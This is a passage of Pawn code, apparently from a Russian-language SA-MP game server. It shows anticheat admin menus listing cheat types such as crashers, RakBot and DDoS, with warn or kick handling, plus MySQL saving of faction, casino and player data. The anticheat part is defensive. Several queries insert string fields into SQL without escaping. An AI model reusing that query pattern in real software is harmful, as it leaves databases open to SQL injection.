	{FFFFFF}Pro Aim\t\t{F81414}129\t%s\n\
	{FFFFFF}Бег CJ\t\t{F81414}130\t%s\n\
	{FFFFFF}CarShot\t\t{F81414}131\t%s\n\
	{FFFFFF}Антивыкидывание из транспорта\t\t{F81414}132\t%s\n\
	{FFFFFF}Антифриз\t\t{F81414}133\t%s\n\
	{FFFFFF}Ghost Hack\t\t{F81414}134\t%s\n\
	{FFFFFF}Silent Aim\t\t{F81414}135\t%s\n\
	{FFFFFF}Ракбот\t\t{F81414}136\t%s\n\
	{FFFFFF}Быстрый реконнект\t\t{F81414}137\t%s\n\
	{FFFFFF}Высокий пинг\t\t{F81414}138\t%s\n\
	{FFFFFF}Подмена диалога\t\t{F81414}139\t%s\n\
	{FFFFFF}Песочница\t\t{F81414}140\t%s\n\
	{FFFFFF}Невалидная версия\t\t{F81414}141\t%s\n\
	{FFFFFF}Ркон авторизация\t\t{F81414}142\t%s\n\
	{FFFFFF}Тюнинг крашер\t\t{F81414}143\t%s\n\
	{FFFFFF}Крашер неверной посадкои\t\t{F81414}144\t%s\n\
	{FFFFFF}Диалог крашер\t\t{F81414}145\t%s\n\
	{FFFFFF}Attach крашер\t\t{F81414}146\t%s\n\
	{FFFFFF}Weapon крашер\t\t{F81414}147\t%s\n\
	{FFFFFF}Подключение в 1 слот\t\t{F81414}148\t%s\n\
	{FFFFFF}Флуд функциями\t\t{F81414}149\t%s\n\
	{FFFFFF}Флуд смен позиции\t\t{F81414}150\t%s\n\
	{FFFFFF}DDos\t\t{F81414}151\t%s\n\
	{FFFFFF}Игнорирование функции\t\t{F81414}152\t\t%s\n\
 	Предыдущая страница",reason_ac[SettingInfo[CheatSetting][26]],
	reason_ac[SettingInfo[CheatSetting][27]],
	reason_ac[SettingInfo[CheatSetting][28]],
	reason_ac[SettingInfo[CheatSetting][29]],
	reason_ac[SettingInfo[CheatSetting][30]],
	reason_ac[SettingInfo[CheatSetting][31]],
	reason_ac[SettingInfo[CheatSetting][32]],
	reason_ac[SettingInfo[CheatSetting][33]],
	reason_ac[SettingInfo[CheatSetting][34]],
	reason_ac[SettingInfo[CheatSetting][35]],
	reason_ac[SettingInfo[CheatSetting][36]],
	reason_ac[SettingInfo[CheatSetting][37]],
	reason_ac[SettingInfo[CheatSetting][38]],
	reason_ac[SettingInfo[CheatSetting][39]],
	reason_ac[SettingInfo[CheatSetting][40]],
	reason_ac[SettingInfo[CheatSetting][41]],
	reason_ac[SettingInfo[CheatSetting][42]],
	reason_ac[SettingInfo[CheatSetting][43]],
	reason_ac[SettingInfo[CheatSetting][44]],
	reason_ac[SettingInfo[CheatSetting][45]],
	reason_ac[SettingInfo[CheatSetting][46]],
	reason_ac[SettingInfo[CheatSetting][47]],
	reason_ac[SettingInfo[CheatSetting][48]],
	reason_ac[SettingInfo[CheatSetting][49]],
	reason_ac[SettingInfo[CheatSetting][50]],
	reason_ac[SettingInfo[CheatSetting][51]],
	reason_ac[SettingInfo[CheatSetting][52]]);
	ShowPlayerDialog(playerid, 379,DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Античит | {ae433d}Администрация", string,">>","<<");
	return true;
}
stock ShowCheatSettingsApanel(playerid)
{
	format(string,1700, "{FFFFFF}Наименование\t\tКод\t\t{FFFFFF}Наказание\n\
	{FFFFFF}AirBreak - Пешком\t\t{F81414}100\t\t%s\n\
	{FFFFFF}AirBreak - В машине\t{F81414}101\t\t%s\n\
	{FFFFFF}Телепорт - Пешком\t\t{F81414}102\t\t%s\n\
	{FFFFFF}Телепорт - в Машине\t\t{F81414}103\t\t%s\n\
	{FFFFFF}Телепорт (Into/Between vehiclest\t\t{F81414}104\t\t%s\n\
	{FFFFFF}Телепорт (vehicle to player)\t\t{F81414}105\t\t%s\n\
	{FFFFFF}Телепорт (pickups)\t\t{F81414}106\t\t%s\n\
	{FFFFFF}FlyHack - Пешком\t\t{F81414}107\t\t%s\n\
	{FFFFFF}FlyHack - В машине\t\t{F81414}108\t\t%s\n\
	{FFFFFF}SpeedHack - Пешком\t\t{F81414}109\t\t%s\n\
	{FFFFFF}SpeedHack - В машине\t\t{F81414}110\t\t%s\n\
	{FFFFFF}Восстановление здоровья - Veh\t\t{F81414}111\t\t%s\n\
	{FFFFFF}Восстановление здоровья - Foot\t\t{F81414}112\t\t%s\n\
	{FFFFFF}Восстановление брони\t\t{F81414}113\t\t%s\n\
	{FFFFFF}Чит на деньги\t\t{F81414}114\t\t%s\n\
	{FFFFFF}Чит на оружие\t\t{F81414}115\t\t%s\n\
	{FFFFFF}Чит на патроны\t\t{F81414}116\t\t%s\n\
	{FFFFFF}Чит на бесконечные патроны\t\t{F81414}117\t\t%s\n\
	{FFFFFF}Специальные анимации\t\t{F81414}118\t\t%s\n\
	{FFFFFF}GoodMode - Пешком\t\t{F81414}119\t\t%s\n\
	{FFFFFF}GoodMode - В машине\t\t{F81414}120\t\t%s\n\
	{FFFFFF}Невидимка\t\t{F81414}121\t\t%s\n\
	{FFFFFF}LagComp Spoof\t\t{F81414}122\t\t%s\n\
	{FFFFFF}Чит на тюннинг\t\t{F81414}123\t\t%s\n\
	{FFFFFF}Паркур мод\t\t{F81414}124\t\t%s\n\
	{FFFFFF}Быстрый разворот\t\t{F81414}125\t\t%s\n\
    Следующая страница",reason_ac[SettingInfo[CheatSetting][0]],
	reason_ac[SettingInfo[CheatSetting][1]],
	reason_ac[SettingInfo[CheatSetting][2]],
	reason_ac[SettingInfo[CheatSetting][3]],
	reason_ac[SettingInfo[CheatSetting][4]],
	reason_ac[SettingInfo[CheatSetting][5]],
	reason_ac[SettingInfo[CheatSetting][6]],
	reason_ac[SettingInfo[CheatSetting][7]],
	reason_ac[SettingInfo[CheatSetting][8]],
	reason_ac[SettingInfo[CheatSetting][9]],
	reason_ac[SettingInfo[CheatSetting][10]],
	reason_ac[SettingInfo[CheatSetting][11]],
	reason_ac[SettingInfo[CheatSetting][12]],
	reason_ac[SettingInfo[CheatSetting][13]],
	reason_ac[SettingInfo[CheatSetting][14]],
	reason_ac[SettingInfo[CheatSetting][15]],
	reason_ac[SettingInfo[CheatSetting][16]],
	reason_ac[SettingInfo[CheatSetting][17]],
	reason_ac[SettingInfo[CheatSetting][18]],
	reason_ac[SettingInfo[CheatSetting][19]],
	reason_ac[SettingInfo[CheatSetting][20]],
	reason_ac[SettingInfo[CheatSetting][21]],
	reason_ac[SettingInfo[CheatSetting][22]],
	reason_ac[SettingInfo[CheatSetting][23]],
	reason_ac[SettingInfo[CheatSetting][24]],
	reason_ac[SettingInfo[CheatSetting][25]]);
	ShowPlayerDialog(playerid, 378, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Античит | {ae433d}Администрация", string,">>","<<");
	return true;
}
stock SaveSettings()
{
	new Buff[2500], query[500];
	format(Buff, 500, "%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d",
	SettingInfo[CheatSetting][0],
	SettingInfo[CheatSetting][1],
	SettingInfo[CheatSetting][2],
	SettingInfo[CheatSetting][3],
	SettingInfo[CheatSetting][4],
	SettingInfo[CheatSetting][5],
	SettingInfo[CheatSetting][6],
	SettingInfo[CheatSetting][7],
	SettingInfo[CheatSetting][8],
	SettingInfo[CheatSetting][9],
	SettingInfo[CheatSetting][10],
	SettingInfo[CheatSetting][11],
	SettingInfo[CheatSetting][12],
	SettingInfo[CheatSetting][13],
	SettingInfo[CheatSetting][14],
	SettingInfo[CheatSetting][15],
	SettingInfo[CheatSetting][16],
	SettingInfo[CheatSetting][17],
	SettingInfo[CheatSetting][18],
	SettingInfo[CheatSetting][19],
	SettingInfo[CheatSetting][20],
	SettingInfo[CheatSetting][21],
	SettingInfo[CheatSetting][22],
	SettingInfo[CheatSetting][23],
	SettingInfo[CheatSetting][24],
	SettingInfo[CheatSetting][25],
	SettingInfo[CheatSetting][26],
	SettingInfo[CheatSetting][27],
	SettingInfo[CheatSetting][28],
	SettingInfo[CheatSetting][29],
	SettingInfo[CheatSetting][30],
	SettingInfo[CheatSetting][31],
	SettingInfo[CheatSetting][32],
	SettingInfo[CheatSetting][33],
	SettingInfo[CheatSetting][34],
	SettingInfo[CheatSetting][35],
	SettingInfo[CheatSetting][36],
	SettingInfo[CheatSetting][37],
	SettingInfo[CheatSetting][38],
	SettingInfo[CheatSetting][39],
	SettingInfo[CheatSetting][40],
	SettingInfo[CheatSetting][41],
	SettingInfo[CheatSetting][42],
	SettingInfo[CheatSetting][43],
	SettingInfo[CheatSetting][44],
	SettingInfo[CheatSetting][45],
	SettingInfo[CheatSetting][46],
	SettingInfo[CheatSetting][47],
	SettingInfo[CheatSetting][48],
	SettingInfo[CheatSetting][49],
	SettingInfo[CheatSetting][50],
	SettingInfo[CheatSetting][51],
	SettingInfo[CheatSetting][52]);
	format(query, sizeof(query), "UPDATE `AntiCheat` SET `CheatSetting` = '%s'",Buff);
	mysql_function_query(DATABASE, query, false, "", "");
}
stock InfoCheats(playerid, id_code)
{
	new TextKick[500];
	switch(id_code)
	{
		case 0: TextKick = "AirBreak - Пешком";
		case 1: TextKick = "AirBreak - В машине";
		case 2: TextKick = "Телепорт - Пешком";
		case 3: TextKick = "Телепорт - В машине";
		case 4: TextKick = "Телепорт (into/between vehicles";
		case 5: TextKick = "Teleport hack (vehicle to player)";
		case 6: TextKick = "Телепорт (pickups)";
		case 7: TextKick = "FlyHack - Пешком";
		case 8: TextKick = "FlyHack - В машине";
		case 9: TextKick = "SpeedHack - Пешком";
		case 10: TextKick = "SpeedHack - В машине";
		case 11: TextKick = "Восстановление здоровья - Veh";
		case 12: TextKick = "Восстановление здоровья - Foot)";
		case 13: TextKick = "Восстановление брони";
		case 14: TextKick = "Чит на деньги";
		case 15: TextKick = "Чит на оружие";
		case 16: TextKick = "Чит на патроны";
		case 17: TextKick = "Чит на бесконечные патроны";
		case 18: TextKick = "Специальные анимации";
		case 19: TextKick = "GodMode - Пешком";
		case 20: TextKick = "GodMode - В авто";
		case 21: TextKick = "Невидимка";
		case 22: TextKick = "lagComp Spoof";
		case 23: TextKick = "Чит на тюнинг";
		case 24: TextKick = "Паркур мод";
		case 25: TextKick = "Быстрый разворот";
		case 26: TextKick = "Ускоренная стрельба";
		case 27: TextKick = "Ложный Спавн";
		case 28: TextKick = "Ложная смерть";
		case 29: TextKick = "Pro Aim";
		case 30: TextKick = "Бег CJ";
		case 31: TextKick = "CarShot";
		case 32: TextKick = "Антивыкидывание из транспорта";
		case 33: TextKick = "Антифриз";
		case 34: TextKick = "Ghost Hack";
		case 35: TextKick = "Silent Aim";
		case 36: TextKick = "Ракбот";
		case 37: TextKick = "Быстрый реконнект";
		case 38: TextKick = "Высокий пинг";
		case 39: TextKick = "Подмена диалога";
		case 40: TextKick = "Песочница";
		case 41: TextKick = "Неверная версия";
		case 42: TextKick = "Ркон авторизация";
		case 43: TextKick = "Тюнинг крашер";
		case 44: TextKick = "Крашер невалидной посадки";
		case 45: TextKick = "Диалог крашер";
		case 46: TextKick = "Attach крашер";
		case 47: TextKick = "Weapon крашер";
		case 48: TextKick = "Подключение в 1 слот";
		case 49: TextKick = "Флуд функциями";
		case 50: TextKick = "Флуд смен позиции";
		case 51: TextKick = "DDos";
		case 52: TextKick = "Игнорирование функции";
	}
	if(SettingInfo[CheatSetting][id_code] == 0) return true;
	if(SettingInfo[CheatSetting][id_code] == 1)
	{
		if(Flood[playerid] > 0) return true;
		Flood[playerid] = 4;
		format(string,sizeof(string), "<Warning> %s[%i]: Возможно %s", PlayerInfo[playerid][pName],playerid,TextKick);
		SendAdminMessage(COLOR_REDD, string);
	}
	if(SettingInfo[CheatSetting][id_code] == 2)
	{
  		 new year1, month1, day1, hour1, minute1, second1;
		 getdate(year1, month1, day1);
		 gettime(hour1, minute1, second1);
		 format(textstr, 512, "{FFFFFF}Вы были кикнуты по подозрению в использовании чит-программ!\n\nПользователь: %s\nПричина: %s\nПоложение 1\nВремя %i:%i %i.%i.%i\n\n{F81414}- {FFFFFF}в случае возникновения ошибки - оставьте жалобу в технический раздел на форуме!\n\nНеобходимые приложения:\n{F81414}- {FFFFFF}Номер сервера\n{F81414}- {FFFFFF}Обстоятельства\n{F81414}- {FFFFFF}Снимок данного диологового окна\n{F81414}- {FFFFFF}Снимок после перезахода с зажатой клавишей *F5*", Name(playerid),TextKick,hour1,minute1,day1,month1,year1);
		 ShowPlayerDialogEx(playerid, 4590, 0, "{FFFFFF}Античит | {ae433d}Сервер", textstr, "OK", "");
		 Kick(playerid);
	}
	return true;
}
stock SaveMySQL(idx, i = 0)
{
	new temp[0x9e];
	switch(idx)
	{
	    case 0:
		{
			mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `"TABLE_OTHERS"` SET ");
			format(temp,sizeof(temp),"`bank_lsnews`= '%i',",FracBank[0][fLsnews]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank_sfnews`= '%i',",FracBank[0][fSfnews]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank_lvnews`= '%i',",FracBank[0][fLvnews]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank_ballas`= '%i',",FracBank[0][fBallas]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank_vagos`= '%i',",FracBank[0][fVagos]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank_grove`= '%i',",FracBank[0][fGrove]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank_aztec`= '%i',",FracBank[0][fAztek]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank_exchequer`= '%i',",FracBank[0][fKazna]), 			strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank_ssmc`= '%i',",FracBank[0][fSsmc]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank_hamc`= '%i',",FracBank[0][fHamc]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank_omc`= '%i',",FracBank[0][fOmc]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank_wmc`= '%i',",FracBank[0][fWmc]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank_hwmc`= '%i',",FracBank[0][fHwmc]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank_fsmc`= '%i',",FracBank[0][fFsmc]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank_pmc`= '%i',",FracBank[0][fPmc]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank_mmc`= '%i',",FracBank[0][fMmc]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank_vmc`= '%i',",FracBank[0][fVmc]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank_bmc`= '%i',",FracBank[0][fBmc]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`heal_ballas`= '%i',",ballashel), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`heal_grove`= '%i',",groovhel), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`heal_vagos`= '%i',",vagoshel), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`heal_aztec`= '%i',",aztekhel), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`heal_rifa`= '%i',",rifahel), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`adprice_ls`= '%i',",addd[0]), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`adprice_sf`= '%i',",addd[1]), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`adprice_lv`= '%i',",addd[2]), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`healprice`= '%i',",healpric), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`heal_yakuza`= '%i',",yakuzahel), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`heal_lcn`= '%i',",lcnhel), 								strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`heal_rm`= '%i',",rmhel), 								strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_lsa`= '%i',",lsamatbi), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_lva`= '%i',",armmatbi), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_sfa`= '%i',",armmatsf), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_ssmc`= '%i',",ssmcmatbi), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_hamc`= '%i',",hamcmatbi), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_omc`= '%i',",omcmatbi), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_wmc`= '%i',",wmcmatbi), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_hwmc`= '%i',",hwmcmatbi), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_fsmc`= '%i',",fsmcmatbi), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_vmc`= '%i',",vmcmatbi), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_pmc`= '%i',",pmcmatbi), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_mmc`= '%i',",mmcmatbi), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_bmc`= '%i',",bmcmatbi), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_rifa`= '%i',",rifamatbi), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_ballas`= '%i',",ballasmatbi), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_aztec`= '%i',",aztekmatbi), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_vagos`= '%i',",vagosmatbi), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_grove`= '%i',",groovmatbi), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_lspd`= '%i',",lspdmatbi), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_fbi`= '%i',",fbimats), 								strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_yakuza`= '%i',",yakuzamats), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_rm`= '%i',",rmmats), 								strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_lcn`= '%i',",lcnmats), 								strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_sfpd`= '%i',",sfpdmats), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`mats_lvpd`= '%i',",lvpdmats), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank_lcn`= '%i',",MafiaBank[0][nLcn]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank_yakuza`= '%i',",MafiaBank[0][nYakuza]), 			strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`bank_rm`= '%i',",MafiaBank[0][nRm]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`best_gang`= '%i',",BestGang), 							strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`slit`= '%i',",slit), 									strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`News_zp`= '%i,%i,%i'",newsZP[1], newsZP[0], newsZP[2]),	strcat(QUERY,temp,sizeof(QUERY));
			mysql_function_query(DATABASE, QUERY, true, "", "");
			mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `grating` SET `mark` = '%i' WHERE `gang` = '%s'", gRating[Grove], "Grove street");
			mysql_function_query(DATABASE, QUERY, true, "", "");
			mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `grating` SET `mark` = '%i' WHERE `gang` = '%s'", gRating[Rifa], "Rifa");
			mysql_function_query(DATABASE, QUERY, true, "", "");
			mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `grating` SET `mark` = '%i' WHERE `gang` = '%s'", gRating[Ballas], "Ballas");
			mysql_function_query(DATABASE, QUERY, true, "", "");
			mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `grating` SET `mark` = '%i' WHERE `gang` = '%s'", gRating[Vagos], "Vagos");
			mysql_function_query(DATABASE, QUERY, true, "", "");
			mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `grating` SET `mark` = '%i' WHERE `gang` = '%s'", gRating[Aztec], "Aztec");
			mysql_function_query(DATABASE, QUERY, true, "", "");
		}
	case 1:
		{
			mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `"TABLE_CASINO"` SET ");
			format(temp,sizeof(temp),"`ID`= '%i',",CasinoInfo[i][caID]), 						strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`Name`= '%s',",CasinoInfo[i][caName]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`Mafia`= '%i',",CasinoInfo[i][caMafia]), 					strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`Manager`= '%s',",CasinoInfo[i][caManager]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`Manager2`= '%s',",CasinoInfo[i][caManager2]), 			strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`Manager3`= '%s',",CasinoInfo[i][caManager3]), 			strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`Krupie`= '%s',",CasinoInfo[i][caKrupie]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`Krupie2`= '%s',",CasinoInfo[i][caKrupie2]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`Krupie3`= '%s',",CasinoInfo[i][caKrupie3]), 				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`Krupie4`= '%s',",CasinoInfo[i][caKrupie4]),				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`Krupie5`= '%s',",CasinoInfo[i][caKrupie5]),				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`Krupie6`= '%s',",CasinoInfo[i][caKrupie6]),				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`Krupie7`= '%s',",CasinoInfo[i][caKrupie7]),				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`Krupie8`= '%s',",CasinoInfo[i][caKrupie8]),				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`Krupie9`= '%s',",CasinoInfo[i][caKrupie9]),				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp),"`Krupie10`= '%s'",CasinoInfo[i][caKrupie10]),				strcat(QUERY,temp,sizeof(QUERY));
			format(temp,sizeof(temp)," WHERE ID = '%i'",CasinoInfo[i][caID]),					strcat(QUERY,temp,sizeof(QUERY));
			mysql_function_query(DATABASE, QUERY, true, "", "");
		}
	case 2:
		{
			if(GetPVarInt(i,"player_save") || !PlayerInfo[i][pLogin]) return true;
			SetPVarInt(i,"player_save",1);
			for(new x = 1; x < 11; x++) GetPlayerWeaponData(i,x,PlayerInfo[i][pWeapon][x-1],PlayerInfo[i][pAmmo][x-1]);
			format(PlayerInfo[i][pWeapons],32,"%i, %i, %i, %i, %i, %i, %i, %i, %i, %i, %i",PlayerInfo[i][pWeapon][0], PlayerInfo[i][pWeapon][1], PlayerInfo[i][pWeapon][2], PlayerInfo[i][pWeapon][3],
			PlayerInfo[i][pWeapon][4], PlayerInfo[i][pWeapon][5], PlayerInfo[i][pWeapon][6], PlayerInfo[i][pWeapon][7], PlayerInfo[i][pWeapon][8], PlayerInfo[i][pWeapon][9], PlayerInfo[i][pWeapon][10]);
			format(PlayerInfo[i][pAmmos],32,"%i, %i, %i, %i, %i, %i, %i, %i, %i, %i, %i",PlayerInfo[i][pAmmo][0], PlayerInfo[i][pAmmo][1], PlayerInfo[i][pAmmo][2], PlayerInfo[i][pAmmo][3],
			PlayerInfo[i][pAmmo][4], PlayerInfo[i][pAmmo][5], PlayerInfo[i][pAmmo][6], PlayerInfo[i][pAmmo][7], PlayerInfo[i][pAmmo][8], PlayerInfo[i][pAmmo][9], PlayerInfo[i][pAmmo][10]);
			format(PlayerInfo[i][pGunSkills],30,"%i, %i, %i, %i, %i ,%i",PlayerInfo[i][pGunSkill][0],PlayerInfo[i][pGunSkill][1],PlayerInfo[i][pGunSkill][2],PlayerInfo[i][pGunSkill][3],PlayerInfo[i][pGunSkill][4],PlayerInfo[i][pGunSkill][5]);
			format(PlayerInfo[i][pChars],30,"%i, %i, %i, %i, %i ,%i",PlayerInfo[i][pChar][0],PlayerInfo[i][pChar][1],PlayerInfo[i][pChar][2],PlayerInfo[i][pChar][3],PlayerInfo[i][pChar][4],PlayerInfo[i][pChar][5]);
			
			mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `"TABLE_ACCOUNTS"` SET `pLevel` = '%i', `pHelper` = '%i', `pRatingSupport` = '%i', `pJobHeal` = '%i', `pMestoJail` = '%i', `pHousecash` = '%i', `pCheckip` = '%i'",
			PlayerInfo[i][pLevel], PlayerInfo[i][pHelper], PlayerInfo[i][pRatingSupport], PlayerInfo[i][pJobHeal], PlayerInfo[i][pMestoJail], PlayerInfo[i][pHousecash], PlayerInfo[i][pCheckip]);

			mysql_format(DATABASE, QUERY, sizeof(QUERY), "%s, `pHP` = '%f', `pSatiety` = '%i', `pDonateRank` = '%i', `pMats` = '%i', `pSex` = '%i', `pArrested` = '%i'",
			QUERY, PlayerInfo[i][pHP], PlayerInfo[i][pSatiety], PlayerInfo[i][pDonateRank], PlayerInfo[i][pMats], PlayerInfo[i][pSex], PlayerInfo[i][pArrested]);

			mysql_format(DATABASE, QUERY, sizeof(QUERY), "%s, `pMuted` = '%i', `pCrimes` = '%i', `pExp` = '%i', `pCash` = '%i',`pPHouseKey` = '%i',`pAdmin` = '%i',`pChar` = '%i', `pWantedDeaths` = '%i', `pPayCheck` = '%i', `pJailTime` = '%i', `pDrugs` = '%i', `pLeader` = '%i', `pMember` = '%i', `pQuestL` = '%i', `pQuest` = '%i', `pQuestP` = '%i', `pQuestF` = '%i', `pQuestPF` = '%i', `pQuestShow` = '%i'",
			QUERY, PlayerInfo[i][pMuted], PlayerInfo[i][pCrimes], PlayerInfo[i][pExp], PlayerInfo[i][pCash], PlayerInfo[i][pPHouseKey],PlayerInfo[i][pAdmin],PlayerInfo[i][pChar][0], PlayerInfo[i][pWantedDeaths], PlayerInfo[i][pPayCheck], PlayerInfo[i][pJailTime], PlayerInfo[i][pDrugs], PlayerInfo[i][pLeader], PlayerInfo[i][pMember], PlayerInfo[i][pQuestL], PlayerInfo[i][pQuest], PlayerInfo[i][pQuestP], PlayerInfo[i][pQuestF], PlayerInfo[i][pQuestPF], PlayerInfo[i][pQuestShow]);

			mysql_format(DATABASE, QUERY, sizeof(QUERY), "%s, `pRank` = '%i', `pChars` = '%s', `pJob` = '%i', `pModel` = '%i', `pPnumber` = '%i', `pDirectory` = '%i', `pVhoddata` = '%i', `pVhodMes` = '%i', `pVhodchas` = '%i', `pVhodminute` = '%i'",
			QUERY, PlayerInfo[i][pRank], PlayerInfo[i][pChars], PlayerInfo[i][pJob], PlayerInfo[i][pModel], PlayerInfo[i][pPnumber], PlayerInfo[i][pDirectory], PlayerInfo[i][pVhoddata], PlayerInfo[i][pVhodMes], PlayerInfo[i][pVhodchas], PlayerInfo[i][pVhodminute]);

			mysql_format(DATABASE, QUERY, sizeof(QUERY), "%s, `pCarLic` = '%i', `pFlyLic` = '%i', `pBoatLic` = '%i', `pFishLic` = '%i', `pGunLic` = '%i', `pBizLic` = '%i', `pZakonp` = '%i', `pText` = '%i'",
			QUERY, PlayerInfo[i][pCarLic], PlayerInfo[i][pFlyLic], PlayerInfo[i][pBoatLic], PlayerInfo[i][pFishLic], PlayerInfo[i][pGunLic], PlayerInfo[i][pBizLic], PlayerInfo[i][pZakonp], PlayerInfo[i][pText]);

			mysql_format(DATABASE, QUERY, sizeof(QUERY), "%s, `pAddiction` = '%i', `pNarcoLomka` = '%i', `pPayDayHad` = '%i', `pTut` = '%i', `pWarns` = '%i', `OffWarns` = '%i', `punWarns` = '%i', `pFuel` = '%i', `pMarriedTo` = '%s', `pMushrooms` = '%i'",
